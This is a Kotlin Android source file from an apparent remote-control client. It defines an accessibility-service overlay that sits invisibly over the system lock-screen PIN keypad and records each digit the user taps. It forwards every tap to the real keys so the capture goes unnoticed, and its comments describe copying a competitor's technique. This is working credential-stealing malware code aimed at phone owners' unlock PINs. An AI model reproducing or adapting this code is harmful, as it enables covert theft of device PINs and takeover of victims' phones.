package com.vibelink.client.keyguard

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.Point
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.math.abs
import kotlin.math.hypot

/**
 * 对齐竞品 mamimobi xm0 + wm0 PIN（含 d/e）：
 * - 全屏 overlay flags=296；xm0.d.compareAndSet → **只挂 1 层**
 * - 短触 P0.rect.contains → wm0.a performAction
 * - "0".."9" 成功后回调采集；"d" 回调删一位；"e" 只点确认不写 buffer
 */
class PinKeypadCaptureOverlay(
    private val service: AccessibilityService,
    private val onPinKey: (keyId: String) -> Unit,
    /** 键位表未齐时 miss：宿主重标定后同坐标再 hit（比竞品丢点更稳） */
    private val onMissRecalibrate: (() -> Unit)? = null,
) {
    private val windowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private val mainHandler = Handler(Looper.getMainLooper())
    private var overlay: View? = null
    private var layoutParams: WindowManager.LayoutParams? = null
    private var pinKeys: Map<String, PinKeyPoint> = emptyMap()
    private var downRawX = 0f
    private var downRawY = 0f
    private var lastCapturedKey: String = ""
    private var lastCapturedAt = 0L
    /** 竞品 xm0.d：CAS 保证不会并发 addView 叠层 */
    private val showingGate = AtomicBoolean(false)

    fun isShowing(): Boolean = overlay != null && showingGate.get()

    fun keyCount(): Int = pinKeys.count { it.value.isDigit }

    fun currentBounds(): Rect {
        val p = layoutParams ?: return Rect()
        return Rect(p.x, p.y, p.x + p.width, p.y + p.height)
    }

    fun show(bounds: Rect, keys: Map<String, PinKeyPoint>) {
        if (bounds.width() <= 0 || bounds.height() <= 0) {
            return
        }
        pinKeys = keys.mapValues { it.value.copyRect() }
        // 已挂载：只更新 bounds/keys，绝不再 addView（对齐竞品单例）
        val existing = overlay
        if (existing != null && showingGate.get()) {
            val params = layoutParams ?: return
            if (params.width != bounds.width() || params.height != bounds.height() ||
                params.x != bounds.left || params.y != bounds.top
            ) {
                params.x = bounds.left
                params.y = bounds.top
                params.width = bounds.width()
                params.height = bounds.height()
                runCatching { windowManager.updateViewLayout(existing, params) }
            }
            return
        }
        if (!showingGate.compareAndSet(false, true)) {
            return
        }
        val view = View(service).apply {
            setBackgroundColor(0x00FF0000)
            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO
            setOnTouchListener(Wm0TouchListener())
        }
        val params = WindowManager.LayoutParams(
            bounds.width(),
            bounds.height(),
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            FLAG_296,
            PixelFormat.TRANSLUCENT,
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = bounds.left
            y = bounds.top
            alpha = 1f
            dimAmount = 0.01f
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
        runCatching {
            windowManager.addView(view, params)
            overlay = view
            layoutParams = params
            Log.i(
                TAG,
                "pin wm0 overlay shown ${bounds.width()}x${bounds.height()} " +
                    "digits=${keyCount()} hasE=${keys.containsKey(PinKeyPoint.KEY_ENTER)} " +
                    "hasD=${keys.containsKey(PinKeyPoint.KEY_DELETE)}",
            )
        }.onFailure {
            Log.w(TAG, "pin wm0 overlay failed", it)
            overlay = null
            layoutParams = null
            showingGate.set(false)
        }
    }

    fun hide(removeOnly: Boolean = false) {
        val view = overlay
        overlay = null
        layoutParams = null
        showingGate.set(false)
        if (view != null) {
            runCatching { view.setOnTouchListener(null) }
            // Samsung：偶发 isAttachedToWindow=false 但仍占着 ty=2032，跳过 remove 会留下全屏吃触摸僵尸窗
            runCatching {
                windowManager.removeViewImmediate(view)
            }.onFailure {
                runCatching { windowManager.removeView(view) }
                    .onFailure { err -> Log.w(TAG, "pin wm0 removeView failed", err) }
            }
        }
        if (!removeOnly) {
            Log.d(TAG, "pin wm0 overlay hidden")
        }
    }

    private inner class Wm0TouchListener : View.OnTouchListener {
        override fun onTouch(v: View, event: MotionEvent): Boolean {
            val rawX = event.rawX
            val rawY = event.rawY
            when (event.actionMasked) {
                MotionEvent.ACTION_DOWN -> {
                    downRawX = rawX
                    downRawY = rawY
                    // 必须 true，否则后续 UP 可能丢（顶行 1/2 最容易踩中）
                    return true
                }
                MotionEvent.ACTION_MOVE -> return true
                MotionEvent.ACTION_CANCEL -> return true
                MotionEvent.ACTION_UP -> {
                    if (abs(rawX - downRawX) >= TAP_SLOP_PX || abs(rawY - downRawY) >= TAP_SLOP_PX) {
                        return true
                    }
                    val point = Point(rawX.toInt(), rawY.toInt())
                    var keyPoint = resolveKeyAt(point.x, point.y)
                    if (keyPoint == null) {
                        // 缓存 rect 过期：强制重标定后再 hit / 最近邻 / 活树
                        onMissRecalibrate?.invoke()
                        keyPoint = resolveKeyAt(point.x, point.y)
                        if (keyPoint != null) {
                            Log.i(
                                TAG,
                                "pin key=${keyPoint.keyId} recovered after recalibrate " +
                                    "at=${point.x},${point.y}",
                            )
                        }
                    }
                    if (keyPoint == null) {
                        Log.w(TAG, "pin hit miss at=${point.x},${point.y} → gesture")
                        // 未命中数字/OK：gesture 点穿，避免 OK 区被全屏层吃掉却无动作
                        fireForgetGesture(point.x.toFloat(), point.y.toFloat())
                        return true
                    }
                    val now = System.currentTimeMillis()
                    if (keyPoint.keyId == lastCapturedKey && now - lastCapturedAt < LOCAL_DEDUPE_MS) {
                        return false
                    }
                    val clicked = performWm0Click(keyPoint)
                    if (clicked) {
                        lastCapturedKey = keyPoint.keyId
                        lastCapturedAt = now
                        Log.i(
                            TAG,
                            "pin key=${keyPoint.keyId} via performAction resId=${keyPoint.resId}",
                        )
                        onPinKey(keyPoint.keyId)
                        return true
                    }
                    Log.w(TAG, "pin key=${keyPoint.keyId} performAction miss → gesture")
                    lastCapturedKey = keyPoint.keyId
                    lastCapturedAt = now
                    onPinKey(keyPoint.keyId)
                    fireForgetGesture(point.x.toFloat(), point.y.toFloat())
                    return true
                }
            }
            return false
        }
    }

    /** contains → 膨胀最近邻 → 活树命中 */
    private fun resolveKeyAt(absX: Int, absY: Int): PinKeyPoint? {
        hitKey(absX, absY)?.let { return it }
        hitKeyNearest(absX, absY)?.let { return it }
        return hitKeyLive(absX, absY)
    }

    private fun hitKey(absX: Int, absY: Int): PinKeyPoint? {
        for ((_, point) in pinKeys) {
            if (point.rect.contains(absX, absY)) {
                return point
            }
        }
        return null
    }

    private fun hitKeyNearest(absX: Int, absY: Int, maxDistPx: Int = NEAREST_KEY_MAX_PX): PinKeyPoint? {
        var best: PinKeyPoint? = null
        var bestDist = Double.MAX_VALUE
        for ((_, point) in pinKeys) {
            val inflated = Rect(point.rect).apply { inset(-maxDistPx, -maxDistPx) }
            if (!inflated.contains(absX, absY)) {
                continue
            }
            val dist = hypot(
                (absX - point.rect.centerX()).toDouble(),
                (absY - point.rect.centerY()).toDouble(),
            )
            if (dist < bestDist) {
                bestDist = dist
                best = point
            }
        }
        return best
    }

    private fun hitKeyLive(absX: Int, absY: Int): PinKeyPoint? {
        val root = findActiveNonOverlayRoot() ?: return null
        try {
            val keyboard = findByViewId(root, PIN_COLOR_NUMERIC_KEYBOARD)
            if (keyboard != null) {
                try {
                    for (i in 0 until keyboard.childCount) {
                        val child = keyboard.getChild(i) ?: continue
                        try {
                            val rect = Rect()
                            child.getBoundsInScreen(rect)
                            if (!rect.contains(absX, absY)) {
                                continue
                            }
                            val desc = child.contentDescription?.toString()?.trim().orEmpty()
                            val text = child.text?.toString()?.trim().orEmpty()
                            val keyId = when {
                                desc.length == 1 && desc[0].isDigit() -> desc
                                text.length == 1 && text[0].isDigit() -> text
                                desc.length == 1 && text.length == 1 && text[0].isDigit() -> text
                                desc.isNotEmpty() && !desc[0].isDigit() -> PinKeyPoint.KEY_DELETE
                                else -> continue
                            }
                            return PinKeyPoint(
                                keyId = keyId,
                                rect = Rect(rect),
                                resId = child.viewIdResourceName,
                            )
                        } finally {
                            child.recycle()
                        }
                    }
                } finally {
                    keyboard.recycle()
                }
            }
            for (digit in 0..9) {
                val node = findByViewId(root, "com.android.systemui:id/key$digit") ?: continue
                try {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.contains(absX, absY)) {
                        return PinKeyPoint(
                            keyId = digit.toString(),
                            rect = Rect(rect),
                            resId = node.viewIdResourceName,
                        )
                    }
                } finally {
                    node.recycle()
                }
            }
        } finally {
            root.recycle()
        }
        return null
    }

    private fun performWm0Click(keyPoint: PinKeyPoint): Boolean {
        val root = findActiveNonOverlayRoot() ?: return false
        try {
            val resId = keyPoint.resId
            if (!resId.isNullOrBlank()) {
                val byId = findByViewId(root, resId)
                if (byId != null) {
                    try {
                        if (clickNode(byId)) {
                            return true
                        }
                    } finally {
                        byId.recycle()
                    }
                }
            }
            if (keyPoint.isDigit) {
                return performColorOsKeyboardChildClick(root, keyPoint.keyId)
            }
            // 确认/删除：按已知 viewId 列表再找一遍
            val fallbackIds = when {
                keyPoint.isEnter -> ENTER_VIEW_IDS
                keyPoint.isDelete -> DELETE_VIEW_IDS
                else -> emptyList()
            }
            for (id in fallbackIds) {
                val node = findByViewId(root, id) ?: continue
                try {
                    if (clickNode(node)) {
                        return true
                    }
                } finally {
                    node.recycle()
                }
            }
            return false
        } finally {
            root.recycle()
        }
    }

    private fun clickNode(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        val parent = node.parent
        return try {
            parent?.takeIf { it.isClickable }
                ?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                ?: node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        } finally {
            parent?.recycle()
        }
    }

    private fun performColorOsKeyboardChildClick(root: AccessibilityNodeInfo, digit: String): Boolean {
        val keyboard = findByViewId(root, PIN_COLOR_NUMERIC_KEYBOARD) ?: return false
        try {
            for (i in 0 until keyboard.childCount) {
                val child = keyboard.getChild(i) ?: continue
                try {
                    val desc = child.contentDescription?.toString()?.trim()
                    val text = child.text?.toString()?.trim()
                    val key = when {
                        !desc.isNullOrEmpty() && desc.length == 1 -> desc
                        !text.isNullOrEmpty() -> text
                        else -> continue
                    }
                    if (key != digit) {
                        continue
                    }
                    if (clickNode(child)) {
                        return true
                    }
                } finally {
                    child.recycle()
                }
            }
        } finally {
            keyboard.recycle()
        }
        return false
    }

    private fun findActiveNonOverlayRoot(): AccessibilityNodeInfo? {
        val windows = runCatching { service.windows }.getOrNull()
        if (!windows.isNullOrEmpty()) {
            try {
                for (window in windows) {
                    val type = window.type
                    if (type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY ||
                        type == AccessibilityWindowInfo.TYPE_INPUT_METHOD ||
                        type == 5
                    ) {
                        continue
                    }
                    if (!window.isActive) {
                        continue
                    }
                    val root = window.root
                    if (root != null) {
                        return root
                    }
                }
            } finally {
                windows.forEach { runCatching { it.recycle() } }
            }
        }
        return service.rootInActiveWindow
    }

    private fun findByViewId(root: AccessibilityNodeInfo, viewId: String): AccessibilityNodeInfo? {
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId) ?: return null
        val first = nodes.firstOrNull()
        nodes.drop(1).forEach { runCatching { it.recycle() } }
        return first
    }

    private fun fireForgetGesture(absX: Float, absY: Float) {
        setPassthrough(true)
        val path = Path().apply { moveTo(absX, absY) }
        val stroke = GestureDescription.StrokeDescription(path, 0, GESTURE_TAP_MS)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        service.dispatchGesture(gesture, null, null)
        mainHandler.postDelayed({ setPassthrough(false) }, GESTURE_RESTORE_MS)
    }

    private fun setPassthrough(passthrough: Boolean) {
        val view = overlay ?: return
        val params = layoutParams ?: return
        val flags = if (passthrough) FLAG_280 else FLAG_296
        if (params.flags == flags) {
            return
        }
        params.flags = flags
        runCatching { windowManager.updateViewLayout(view, params) }
    }

    companion object {
        private const val TAG = "PatternCapture"
        private const val TAP_SLOP_PX = 50f
        private const val LOCAL_DEDUPE_MS = 200L
        private const val NEAREST_KEY_MAX_PX = 72
        private const val GESTURE_TAP_MS = 50L
        private const val GESTURE_RESTORE_MS = 80L
        private const val PIN_COLOR_NUMERIC_KEYBOARD =
            "com.android.systemui:id/pinColorNumericKeyboard"

        private val ENTER_VIEW_IDS = listOf(
            "com.android.systemui:id/key_enter",
            "com.android.systemui:id/key_enter_text",
            "com.android.systemui:id/vivo_pin_confirm",
            "com.android.systemui:id/btn_letter_ok",
            "com.android.systemui:id/mix_normal_confirm",
            "com.android.keyguard:id/key_enter",
        )
        private val DELETE_VIEW_IDS = listOf(
            "com.android.systemui:id/delete_button",
            "com.android.systemui:id/btn_letter_delete",
            "com.android.systemui:id/vivo_cancel",
            "com.android.keyguard:id/delete_button",
        )

        private const val FLAG_296 =
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN

        private const val FLAG_280 =
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
    }
}
